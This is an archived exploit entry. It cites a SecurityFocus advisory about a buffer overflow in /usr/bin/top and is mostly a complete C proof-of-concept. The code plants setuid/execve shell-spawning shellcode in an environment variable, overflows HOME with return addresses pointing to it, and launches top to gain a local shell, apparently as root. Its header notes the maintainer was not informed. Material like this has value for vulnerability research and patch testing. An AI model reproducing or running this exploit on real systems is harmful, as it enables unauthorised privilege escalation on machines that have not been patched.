source: http://www.securityfocus.com/bid/8239/info

A buffer overflow condition has been reported in top when handling environment variables of excessive length. This may result in an attacker potentially executing arbitrary code.

/*
 * UHAGr CONFIDENTIAL SOURCE - DO NOT DISTRIBUTE
 * Local /usr/bin/top Proof of Concept Exploit
 * Bug Discovered & Coded by Darksock
 * Copyright (c) by UHAGr 2003 - 2004
 * Note: it should work on all distros
 * Tested under RedHat 9.0, Mandrake 9.0
 * Still, it should be working under all
 * distros since it's maintainer is still
 * not informed about this bug.
 */

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>

        /*
         * This method of exploitation would let as
         * know the exact address of our shellcode.
         * We place it to the last environmental
         * variable, which address will be:
         * 0xbfffffff(top of the stack) minus four
         * NULLs due to elf header structure, minus
         * the program's name, minus the bytes of
         * our shellcode. That simple ;)
         */

#define TOP "/usr/bin/top"
#define DEFRET 0xbffffffa - strlen(sc) - strlen(TOP)
#define BS 1100

        /*
         * setuid(); + execve(); + exit(); shellcode
         */

char sc[] =   "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31"
              "\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
              "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1"
              "\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\x31"
              "\xc0\x31\xdb\xb0\x01\xcd\x80";

int main(void) {

        int ctr = 0;
        char buffer[BS];

        fprintf(stdout, "\nCopyright (c) by UHAGr 2003 - 2004\n");
        fprintf(stdout, "/usr/bin/top Proof of Concept Exploit\n\n");
        fprintf(stdout, "[~] Starting exploiting proccess...\n");
        fprintf(stdout, "[~] Using ret address: 0x%8x\n", (long) DEFRET);

        for(ctr = 0; ctr <  BS - 1; ctr += 4)
                *(long *) &buffer[ctr] = (long) DEFRET;

        buffer[BS - 1] = '\0';

        fprintf(stdout, "[~] Setting environmental variables\n");
        if((setenv("HOME", buffer, 1)) == -1) {
                perror("setenv()");
                exit(1);
        }

        if((setenv("TOPX", sc, 1)) == -1) {
                perror("setenv()");
                exit(1);
        }

        fprintf(stdout, "[~] Executing %s...\n\n", TOP);

        if((execl(TOP, TOP, NULL)) == -1) {
                perror("execl()");
                exit(1);
        }
        return(0);
}
